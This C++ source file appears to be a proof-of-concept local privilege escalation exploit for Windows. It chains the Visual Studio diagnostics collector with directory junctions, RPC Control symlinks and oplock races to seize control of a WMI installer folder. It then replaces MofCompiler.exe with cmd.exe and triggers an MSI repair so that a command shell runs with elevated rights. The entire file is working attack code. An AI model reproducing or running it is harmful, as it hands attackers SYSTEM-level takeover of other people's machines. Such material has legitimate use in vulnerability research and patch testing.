#include "def.h"


WCHAR cmd[] = L"C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Team Tools\\DiagnosticsHub\\Collector\\VSDiagnostics.exe";


int wmain(int argc, wchar_t** argv)
{


   

    
    load(); 
    CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
    GenTmp(exploit);
    GenTmp(exploit2);
    BOOL done = FALSE;
    WIN32_FIND_DATA FindFileData;
    HANDLE hFind;
    sessionid = 1;
    CreateDirectory(exploit, NULL);
    CreateDirectory(exploit2, NULL);
  

   
    hDir2 = CreateFile(exploit, FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_OPEN_REPARSE_POINT, NULL);
    if (hDir2 == INVALID_HANDLE_VALUE)
    {
        printf("[-] Cannot open directory! Error: %d\n",GetLastError());
        return -1;
    }

    DoMain();
    
    Sleep(5000);
    firstdone = TRUE;
    memset(target, 0x0, 256);
    swprintf(target, L"\\??\\C:\\Programdata\\Microsoft");
    sessionid = sessionid + 1;
    DoMain();
   
    HANDLE wer;
    do {
        Sleep(1000);
        wer = CreateFile(L"C:\\ProgramData\\Microsoft\\VisualStudio\\SetupWMI\\MofCompiler.exe", DELETE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, 0, NULL);
    } while (wer == INVALID_HANDLE_VALUE);
    Move(wer);
    CloseHandle(wer);
    printf("[+] Persmissions successfully reseted!\n[*] Starting WMI installer.\n");
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Replace, NULL, 0, NULL);
    StartWMIMsi();

    while (finished == FALSE) {};
   
    
    
}

HRESULT GetPropertyStore(PCWSTR pszFilename, GETPROPERTYSTOREFLAGS gpsFlags, IPropertyStore** ppps)
{
    WCHAR szExpanded[MAX_PATH];

    HRESULT hr = ExpandEnvironmentStrings(pszFilename, szExpanded, ARRAYSIZE(szExpanded)) ? S_OK : HRESULT_FROM_WIN32(GetLastError());
    if (SUCCEEDED(hr))
    {
        WCHAR szAbsPath[MAX_PATH];
        hr = _wfullpath(szAbsPath, szExpanded, ARRAYSIZE(szAbsPath)) ? S_OK : E_FAIL;
        if (SUCCEEDED(hr))
        {

            hr = SHGetPropertyStoreFromParsingName(szAbsPath, NULL, gpsFlags, IID_PPV_ARGS(ppps));
        }
    }
    return hr;
}
BOOL FindProperty(IPropertyStore* pps, REFPROPERTYKEY key, PCWSTR pszCanonicalName)
{
    PROPVARIANT propvarValue = { 0 };
    HRESULT hr = pps->GetValue(key, &propvarValue);
    if (SUCCEEDED(hr))
    {
        PWSTR pszDisplayValue = NULL;
        hr = PSFormatForDisplayAlloc(key, propvarValue, PDFF_DEFAULT, &pszDisplayValue);
        if (SUCCEEDED(hr))
        {

            if (wcswcs(pszDisplayValue, L"WMI"))
            {
                CoTaskMemFree(pszDisplayValue);
                return TRUE;
            }
            CoTaskMemFree(pszDisplayValue);
        }
        PropVariantClear(&propvarValue);
    }
    return FALSE;
}
HRESULT GetPropertyValue(PCWSTR pszFilename, PCWSTR pszCanonicalName)
{

    PROCESS_INFORMATION pi;
    STARTUPINFO si;
    si.cb = sizeof(si);
    WCHAR start[256] = { 0x0 };
    PROPERTYKEY key;
    HRESULT hr = PSGetPropertyKeyFromName(pszCanonicalName, &key);
    if (SUCCEEDED(hr))
    {
        IPropertyStore* pps = NULL;


        hr = GetPropertyStore(pszFilename, GPS_DEFAULT, &pps);
        if (SUCCEEDED(hr))
        {
            if (FindProperty(pps, key, pszCanonicalName))
            {

                swprintf(start, L"C:\\windows\\system32\\msiexec.exe /fa %ls", pszFilename);
                printf("[*] Command to execute: %ls\n", start);

                _wsystem(start);
            }
            pps->Release();
        }
        else
        {
            wprintf(L"Error %x: getting the propertystore for the item.\n", hr);
        }
    }
    else
    {
        wprintf(L"Invalid property specified: %s\n", pszCanonicalName);
    }
    return hr;
}
VOID StartWMIMsi()
{

    Sleep(2000);
    WIN32_FIND_DATA hh;
    HANDLE hFind = FindFirstFile(L"C:\\windows\\installer\\*.msi", &hh);
    do
    {
        wchar_t path[256] = { 0x0 };
        swprintf(path, L"C:\\windows\\installer\\%s", hh.cFileName);
        GetPropertyValue(path, L"System.Subject");

    } while (FindNextFileW(hFind, &hh));
}
VOID Replace()
{
    PFILE_NOTIFY_INFORMATION fi = NULL;
    BOOL deleted = FALSE;
    wchar_t file[MAX_PATH] = { 0x0 };
    SetThreadPriorityBoost(GetCurrentThread(), TRUE);
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
    FileOpLock* oplock;
    hDir = CreateFile(L"C:\\ProgramData\\Microsoft\\VisualStudio\\SetupWMI", GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
    do {

        wchar_t buff[4096] = { 0 };
        DWORD ret = 0;
        ReadDirectoryChangesW(hDir, buff, 4096, TRUE, FILE_NOTIFY_CHANGE_FILE_NAME, &ret, NULL, NULL);
        fi = (PFILE_NOTIFY_INFORMATION)buff;
        if ((fi->Action == FILE_ACTION_ADDED) && (wcscmp(fi->FileName, L"MofCompiler.exe") == 0)) {


            do {
                hFile2 = CreateFile(L"C:\\ProgramData\\Microsoft\\VisualStudio\\SetupWMI\\MofCompiler.exe", DELETE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED, NULL);
            } while (hFile2 == INVALID_HANDLE_VALUE);
            oplock = FileOpLock::CreateLock(hFile2, cb1);
            if (oplock != NULL)
            {
                oplock->WaitForLock(INFINITE);
            }
            deleted = TRUE;
        }
    } while (deleted == FALSE);

}
void cb1()
{
    printf("[*] Oplock!\n");
    while (!Move(hFile2)) {}
    printf("[+] File moved!\n");
    CopyFile(L"c:\\windows\\system32\\cmd.exe", L"C:\\ProgramData\\Microsoft\\VisualStudio\\SetupWMI\\MofCompiler.exe", FALSE);
    finished = TRUE;
}


VOID DoMain() {
    BOOL done = FALSE;
    CreateJunction(hDir2, exploit2);
    Watch();
    CloseHandle(hDir);
    hDir = CreateFile(exploit2, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_OPEN_REPARSE_POINT, NULL);

    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Trigger, NULL, 0, NULL);
    SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
    SetThreadPriorityBoost(GetCurrentThread(), TRUE);
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
    FileOpLock* oplock;
    wchar_t tmp[256] = { 0x0 };
    do
    {
        wchar_t buff[4096] = { 0 };
        DWORD ret = 0;
        ReadDirectoryChangesW(hDir, buff, 4096, FALSE, FILE_NOTIFY_CHANGE_FILE_NAME, &ret, NULL, NULL);
        fi = (PFILE_NOTIFY_INFORMATION)buff;
        if ((fi->Action == FILE_ACTION_ADDED) && (wcswcs(fi->FileName, L"Report.")))

        {


           
           CreateJunction(hDir2, L"\\RPC Control");
           done = true;
        }
    } while (done != TRUE);
}
VOID Watch()
{   
    hDir = CreateFile(exploit2, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_OPEN_REPARSE_POINT, NULL);

    PFILE_NOTIFY_INFORMATION fi = NULL;
    BOOL done = FALSE;
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)start, NULL, 0, NULL);
    do
    {
        wchar_t buff[4096] = { 0 };
        DWORD ret = 0;
        ReadDirectoryChangesW(hDir, buff, 4096, FALSE, FILE_NOTIFY_CHANGE_DIR_NAME, &ret, NULL, NULL);
        fi = (PFILE_NOTIFY_INFORMATION)buff;
        if ((fi->Action == FILE_ACTION_ADDED) && (wcswcs(fi->FileName, L".scratch")))

        {



            wchar_t* token = wcstok(fi->FileName, L".");
         
            swprintf(object, L"Global\\GLOBALROOT\\RPC Control\\Report.%s.diagsession", token);

            DosDeviceSymLink(object, target);

            done = true;
        }
    } while (done != TRUE);
}
VOID start()
{
    Sleep(2000);
    PROCESS_INFORMATION pi;
    STARTUPINFO si;
    si.cb = sizeof(si);
    WCHAR start[256] = { 0x0 };
    
    swprintf(start, L" start %d /scratchLocation:%s", sessionid,exploit);
    if (CreateProcess(cmd, start, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
    {
        return;
    }
    printf("[-] Cannot start process!\n");
    exit(1);
}
VOID Trigger()
{
    Sleep(2000);
    PROCESS_INFORMATION pi,pi2;
    STARTUPINFO si,si2;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&si2, sizeof(si2));
    si.cb = sizeof(si);
    si2.cb = sizeof(si2);
   
    WCHAR start[256] = { 0x0 };
    WCHAR stop[256] = { 0x0 };
    
    
    swprintf(stop, L" stop %d /output:c:\\windows\\temp\\aaaaddadad", sessionid);
    
   if (CreateProcess(cmd, stop, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            return;
     }
    
    printf("[-] Cannot start process!\n");
    exit(1);
}
VOID SetOplock() {

    FileOpLock* oplock;
    hDir3 = CreateFile(dir, GENERIC_READ, FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED|FILE_FLAG_OPEN_REPARSE_POINT | FILE_FLAG_BACKUP_SEMANTICS, NULL);
    if (hDir3 == INVALID_HANDLE_VALUE) {
        printf("[-] Cannot open %ls directory!\n", dir);
        exit(1);
    }
    oplock = FileOpLock::CreateLock(hDir3, cb0);

    if (oplock != NULL) {
        oplock->WaitForLock(INFINITE);
    }


}



void cb0() {
    printf("[+] Oplock triggered!\n");
    wchar_t* token = wcstok(fi->FileName, L"\\");
    token = wcstok(NULL, L"\\");
    swprintf(object, L"Global\\GLOBALROOT\\RPC Control\\%s", token);

    DosDeviceSymLink(object, target);
    CreateJunction(hDir2, L"\\RPC Control");
    firstdone = TRUE;
 }
VOID GenTmp(WCHAR* tmpfile) {
    memset(tmpfile, 0x0, 256);
    RPC_WSTR str_uuid;
    UUID uuid = { 0 };
    UuidCreate(&uuid);
    UuidToString(&uuid, &str_uuid);
    _swprintf(tmpfile, L"\\??\\C:\\%s", str_uuid);
    
}
BOOL Move(HANDLE hFile) {
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[!] Invalid handle!\n");
        return FALSE;
    }
    wchar_t tmpfile[MAX_PATH] = { 0x0 };
    RPC_WSTR str_uuid;
    UUID uuid = { 0 };
    UuidCreate(&uuid);
    UuidToString(&uuid, &str_uuid);
    _swprintf(tmpfile, L"\\??\\C:\\windows\\temp\\%s", str_uuid);
    size_t buffer_sz = sizeof(FILE_RENAME_INFO) + (wcslen(tmpfile) * sizeof(wchar_t));
    FILE_RENAME_INFO* rename_info = (FILE_RENAME_INFO*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY | HEAP_GENERATE_EXCEPTIONS, buffer_sz);
    IO_STATUS_BLOCK io = { 0 };
    rename_info->ReplaceIfExists = TRUE;
    rename_info->RootDirectory = NULL;
    rename_info->Flags = 0x00000001 | 0x00000002 | 0x00000040;
    rename_info->FileNameLength = wcslen(tmpfile) * sizeof(wchar_t);
    memcpy(&rename_info->FileName[0], tmpfile, wcslen(tmpfile) * sizeof(wchar_t));
    NTSTATUS status = pNtSetInformationFile(hFile, &io, rename_info, buffer_sz, 65);
    if (status != 0) {
        return FALSE;
    }
    return TRUE;
}
void load() {
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    if (ntdll != NULL) {
        pRtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(ntdll, "RtlInitUnicodeString");
        pNtCreateFile = (_NtCreateFile)GetProcAddress(ntdll, "NtCreateFile");
       
        pNtSetInformationFile = (_NtSetInformationFile)GetProcAddress(ntdll, "NtSetInformationFile");
    }
    if (pRtlInitUnicodeString == NULL || pNtCreateFile == NULL || pNtSetInformationFile == NULL) {
        printf("Cannot load api's %d\n", GetLastError());
        exit(0);
    }

}
BOOL CreateJunction(HANDLE hDir, LPCWSTR target) {
    HANDLE hJunction;
    DWORD cb;
    wchar_t printname[] = L"";
    if (hDir == INVALID_HANDLE_VALUE) {
        printf("[!] HANDLE invalid!\n");
        return FALSE;
    }
    SIZE_T TargetLen = wcslen(target) * sizeof(WCHAR);
    SIZE_T PrintnameLen = wcslen(printname) * sizeof(WCHAR);
    SIZE_T PathLen = TargetLen + PrintnameLen + 12;
    SIZE_T Totalsize = PathLen + (DWORD)(FIELD_OFFSET(REPARSE_DATA_BUFFER, GenericReparseBuffer.DataBuffer));
    PREPARSE_DATA_BUFFER Data = (PREPARSE_DATA_BUFFER)malloc(Totalsize);
    Data->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
    Data->ReparseDataLength = PathLen;
    Data->Reserved = 0;
    Data->MountPointReparseBuffer.SubstituteNameOffset = 0;
    Data->MountPointReparseBuffer.SubstituteNameLength = TargetLen;
    memcpy(Data->MountPointReparseBuffer.PathBuffer, target, TargetLen + 2);
    Data->MountPointReparseBuffer.PrintNameOffset = (USHORT)(TargetLen + 2);
    Data->MountPointReparseBuffer.PrintNameLength = (USHORT)PrintnameLen;
    memcpy(Data->MountPointReparseBuffer.PathBuffer + wcslen(target) + 1, printname, PrintnameLen + 2);
    WCHAR dir[MAX_PATH] = { 0x0 };
    if (DeviceIoControl(hDir, FSCTL_SET_REPARSE_POINT, Data, Totalsize, NULL, 0, &cb, NULL) != 0)
    {

        GetFinalPathNameByHandle(hDir, dir, MAX_PATH, 0);
        printf("[+] Junction %ls -> %ls created!\n", dir, target);
        free(Data);
        return TRUE;

    }
    else
    {

       // printf("[!] Error: %d. Exiting\n", GetLastError());
        free(Data);
        return FALSE;
    }
}
BOOL DeleteJunction(HANDLE handle) {
    REPARSE_GUID_DATA_BUFFER buffer = { 0 };
    BOOL ret;
    buffer.ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
    DWORD cb = 0;
    IO_STATUS_BLOCK io;
    if (handle == INVALID_HANDLE_VALUE) {
        printf("[!] HANDLE invalid!\n");
        return FALSE;
    }
    WCHAR dir[MAX_PATH] = { 0x0 };
    if (DeviceIoControl(handle, FSCTL_DELETE_REPARSE_POINT, &buffer, REPARSE_GUID_DATA_BUFFER_HEADER_SIZE, NULL, NULL, &cb, NULL)) {
        GetFinalPathNameByHandle(handle, dir, MAX_PATH, 0);
        printf("[+] Junction %ls deleted!\n", dir);
        return TRUE;
    }
    else
    {
        printf("[!] Error: %d.\n", GetLastError());
        return FALSE;
    }
}

BOOL DosDeviceSymLink(LPCWSTR object, LPCWSTR target) {
    if (DefineDosDevice(DDD_NO_BROADCAST_SYSTEM | DDD_RAW_TARGET_PATH, object, target)) {
        printf("[+] Symlink %ls -> %ls created!\n", object, target);
        return TRUE;

    }
    else
    {
        printf("error :%d\n", GetLastError());
        return FALSE;

    }
}

BOOL DelDosDeviceSymLink(LPCWSTR object, LPCWSTR target) {
    if (DefineDosDevice(DDD_NO_BROADCAST_SYSTEM | DDD_RAW_TARGET_PATH | DDD_REMOVE_DEFINITION | DDD_EXACT_MATCH_ON_REMOVE, object, target)) {
        printf("[+] Symlink %ls -> %ls deleted!\n", object, target);
        return TRUE;

    }
    else
    {
        printf("error :%d\n", GetLastError());
        return FALSE;


    }
}
LPWSTR  BuildPath(LPCWSTR path) {
    wchar_t ntpath[MAX_PATH];
    swprintf(ntpath, L"\\??\\%s", path);
    return ntpath;

}
HANDLE myCreateDirectory(LPWSTR file, DWORD access, DWORD share, DWORD dispostion) {
    UNICODE_STRING ufile;
    HANDLE hDir;
    pRtlInitUnicodeString(&ufile, file);
    OBJECT_ATTRIBUTES oa = { 0 };
    IO_STATUS_BLOCK io = { 0 };
    InitializeObjectAttributes(&oa, &ufile, OBJ_CASE_INSENSITIVE, NULL, NULL);

    retcode = pNtCreateFile(&hDir, access, &oa, &io, NULL, FILE_ATTRIBUTE_NORMAL, share, dispostion, FILE_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT, NULL, NULL);

    if (!NT_SUCCESS(retcode)) {
        return NULL;
    }
    return hDir;
}
